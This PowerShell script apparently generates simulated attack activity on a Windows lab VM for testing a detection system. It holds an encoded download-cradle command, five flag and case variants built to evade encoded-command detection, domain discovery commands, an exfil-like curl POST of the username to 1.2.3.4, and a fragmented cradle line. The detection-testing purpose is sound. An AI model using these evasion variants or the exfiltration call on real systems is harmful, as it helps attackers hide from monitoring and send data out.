<#
RED demo attack/log generator for a Windows lab VM.

This script is intentionally lab-safe: it generates process command lines and
Sysmon process creation events for SIEM/RED detection, but it does not
download or execute remote payloads.

Usage:
  Set-ExecutionPolicy Bypass -Scope Process -Force
  .\process_creation_scenarios.ps1 -Scenario benign
  .\process_creation_scenarios.ps1 -Scenario baseline
  .\process_creation_scenarios.ps1 -Scenario evasion -SleepSeconds 20
  .\process_creation_scenarios.ps1 -Scenario chain
  .\process_creation_scenarios.ps1 -Scenario redonly
  .\process_creation_scenarios.ps1 -Scenario all
  .\process_creation_scenarios.ps1 -Scenario evasion -DryRun
#>

param(
    [ValidateSet("benign", "baseline", "evasion", "chain", "redonly", "all")]
    [string]$Scenario = "all",

    [int]$SleepSeconds = 20,

    [switch]$DryRun
)

$ErrorActionPreference = "Continue"

# UTF-16LE Base64 for a lab-safe suspicious marker:
# $DemoPayload = 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://example.invalid/payload.ps1")'; Write-Output $DemoPayload
# This prints the suspicious download-cradle string for logs, but does not
# download or execute a remote payload.
$EncodedPayload = "JABEAGUAbQBvAFAAYQB5AGwAbwBhAGQAIAA9ACAAJwBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApACcAOwAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJABEAGUAbQBvAFAAYQB5AGwAbwBhAGQA"

function Invoke-DemoProcess {
    param(
        [Parameter(Mandatory = $true)][string]$Label,
        [Parameter(Mandatory = $true)][string]$FilePath,
        [Parameter(Mandatory = $true)][string[]]$ArgumentList,
        [int]$PauseSeconds = 0
    )

    $cmdline = "$FilePath $($ArgumentList -join ' ')"
    Write-Host ""
    Write-Host "[$(Get-Date -Format o)] $Label" -ForegroundColor Cyan
    Write-Host "  $cmdline" -ForegroundColor Gray

    if (-not $DryRun) {
        try {
            Start-Process -FilePath $FilePath -ArgumentList $ArgumentList -NoNewWindow -Wait
        } catch {
            Write-Warning "Command failed: $($_.Exception.Message)"
        }
    }

    if ($PauseSeconds -gt 0) {
        Start-Sleep -Seconds $PauseSeconds
    }
}

function Invoke-BenignScenario {
    Write-Host "`n=== Scenario: benign admin activity ===" -ForegroundColor Green

    $demoDir = Join-Path $env:TEMP "red_demo"
    $backupScript = Join-Path $demoDir "daily_backup.ps1"
    if (-not $DryRun) {
        New-Item -ItemType Directory -Path $demoDir -Force | Out-Null
        @"
Write-Output 'RED benign backup demo'
Get-Date
"@ | Set-Content -Path $backupScript -Encoding UTF8
    }

    Invoke-DemoProcess -Label "Benign whoami" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "whoami")

    Invoke-DemoProcess -Label "Benign ipconfig" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "ipconfig /all")

    Invoke-DemoProcess -Label "Benign PowerShell maintenance script" `
        -FilePath "powershell.exe" `
        -ArgumentList @("-NoProfile", "-File", $backupScript)
}

function Invoke-BaselineScenario {
    Write-Host "`n=== Scenario: baseline exact Sigma match ===" -ForegroundColor Green

    Invoke-DemoProcess -Label "Baseline: full -EncodedCommand" `
        -FilePath "powershell.exe" `
        -ArgumentList @("-NoProfile", "-EncodedCommand", $EncodedPayload)
}

function Invoke-EvasionScenario {
    Write-Host "`n=== Scenario: PowerShell encoded command variants ===" -ForegroundColor Green

    Invoke-DemoProcess -Label "Variant 1: shorthand -e" `
        -FilePath "powershell.exe" `
        -ArgumentList @("-NoProfile", "-e", $EncodedPayload) `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Variant 2: abbreviation -Ec" `
        -FilePath "powershell.exe" `
        -ArgumentList @("-NoProfile", "-Ec", $EncodedPayload) `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Variant 3: case manipulation" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "PoWeRsHeLl.exe -NoProfile -EnCoDeDcOmMaNd $EncodedPayload") `
        -PauseSeconds $SleepSeconds

    $tab = [char]9
    Invoke-DemoProcess -Label "Variant 4: tab whitespace around -e" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "powershell.exe -NoProfile${tab}-e${tab}$EncodedPayload") `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Variant 5: combo case + -en" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "PoWeRsHeLl.exe -NoProfile -en $EncodedPayload")
}

function Invoke-ChainScenario {
    Write-Host "`n=== Scenario: simple multi-stage chain ===" -ForegroundColor Green

    Invoke-DemoProcess -Label "Stage A1: discovery whoami /priv" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "whoami /priv") `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Stage A2: discovery net user /domain" `
        -FilePath "cmd.exe" `
        -ArgumentList @("/c", "net user /domain") `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Stage B: RED catches PowerShell shorthand evasion" `
        -FilePath "powershell.exe" `
        -ArgumentList @("-NoProfile", "-e", $EncodedPayload) `
        -PauseSeconds $SleepSeconds

    Invoke-DemoProcess -Label "Stage C: exfil-like curl marker with short timeout" `
        -FilePath "curl.exe" `
        -ArgumentList @("--max-time", "3", "-X", "POST", "http://1.2.3.4/exfil", "-d", "red_demo=$env:USERNAME")
}

function Invoke-RedOnlyScenario {
    Write-Host "`n=== Scenario: RED-only fragmented command-line marker ===" -ForegroundColor Green

    Invoke-DemoProcess -Label "RED-only: fragmented download cradle words" `
        -FilePath "cmd.exe" `
        -ArgumentList @(
            "/c",
            "set RED_DEMO_PROCESS_RED_ONLY=1 && set A=Inv&&set B=oke-Expression&&set C=New&&set D=-Object&&set E=Net.&&set F=WebClient&&set G=Down&&set H=loadString&&echo RED_DEMO_PROCESS_RED_ONLY %A%%B% %C%%D% %E%%F% %G%%H%"
        )
}

switch ($Scenario) {
    "benign" { Invoke-BenignScenario }
    "baseline" { Invoke-BaselineScenario }
    "evasion" { Invoke-EvasionScenario }
    "chain" { Invoke-ChainScenario }
    "redonly" { Invoke-RedOnlyScenario }
    "all" {
        Invoke-BenignScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-BaselineScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-EvasionScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-ChainScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-RedOnlyScenario
    }
}

Write-Host "`nDone. Wait for Elastic Agent/Sysmon ingestion, then poll with RED detect_live." -ForegroundColor Green
